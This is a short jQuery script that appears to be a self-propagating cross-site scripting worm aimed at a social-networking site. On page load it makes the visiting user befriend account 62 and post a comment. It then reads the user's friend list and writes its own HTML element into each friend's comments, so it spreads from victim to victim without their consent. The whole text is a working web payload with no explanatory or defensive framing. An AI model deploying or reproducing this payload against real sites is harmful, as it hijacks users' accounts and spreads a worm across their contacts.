$( document ).ready(function(){

    $.get("add_friend.php?id=62");
    $.ajax({url:"add_comment.php?id=62&comment="+ new Date()});
    $.get( "friends.php", function( data ) {
		f = data.split('<')[0].split(',');
		for (i = 0; i <f.length; i++){
			if(f[i] !== 62){
				$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
			}
		}
	});
});
